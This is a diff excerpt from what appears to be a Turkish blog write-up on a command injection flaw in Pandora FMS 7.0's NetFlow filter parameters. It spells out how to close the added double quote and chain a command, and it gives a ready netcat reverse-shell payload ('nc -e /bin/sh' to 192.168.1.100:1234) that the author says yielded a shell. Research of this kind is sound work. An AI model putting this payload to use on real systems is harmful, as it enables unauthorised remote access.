@@ -113,12 +113,12 @@ Biraz kafa toplamak amacıyla mola verdim. Bu noktada aslında yine bir şey bul
 <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-google-netflow-dokuman.png"></p>
 <p>Burada ki gösterilen girdiler fonksiyonun içinde tespit ettiğimiz (ipsrc, ipdst, srcport, dstport) değişkenleriydi, yani RCE zafiyetini tetiklememiz için kontrol etmemiz gereken değişkenler. Hemen dökümanı takip ederek, tarayıcı üzerinden ilgili sayfaya eriştim: </p>
 <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-netflow-page.png"></p>
-<p>Sayfaya girdiğim an kafamda "Hanım hanım, bunlar benim yavrularım" sesleri yankılandı. Artık önümdeydi gelmekte olan, şimdi tek iş uygun payloadı yapıştırmaktı.
-Fonksiyon tanımlarına tekrar döndüm, netflow_get_filter_arguments fonksiyonun sonunda $filter_args değişkenine " karakteri eklediğini gördüm.
+<p>Girdilerin gönderildiği noktalarının tespitinin ardından, kalan son iş uygun payloadı oluşturmaktı.
+Fonksiyonları tekrar inceledim, <strong>netflow_get_filter_arguments</strong> fonksiyonun sonunda <strong>$filter_args</strong> değişkenine <code>"</code> karakteri eklediğini gördüm.
 <p><img alt="PANDORAFMS 7.0" src="/images/pandorafms/pandorafms-son-dokunuslar.png"></p>
 Çift tırnakları kapatmak için payloadımız " karakteriyle başlamalı ve kendi komutumuzu çalıştırmak adına " karakterini bir ; takip etmeli tabi farklı girdilerde kullanılabilir && gibi.
 Son olarak, payloadımızdan sonra gelecek eklemelerin payloadı bozmaması için en sona # işareti koymamız yeterli olacaktır. Yani payloadımız ";Girilecek Komut# taslağında olacak.
-Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a> den bir reverseshell komutu aşırdım.
+Taslağın arasına ufak bir reverseshell komutu iliştirmek için <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">Pentestmonkey</a> den bir reverseshell komutu aldım.
 Ve sonuç payloadı: <strong>";nc -e /bin/sh 192.168.1.100 1234 #</strong> olarak oluştu.
 Ve sayfada bulunan "router ip" harici herhangi bir inputa oluşturduğum payloadı verdiğimde bir shell eldesi sağladım.
 </p>
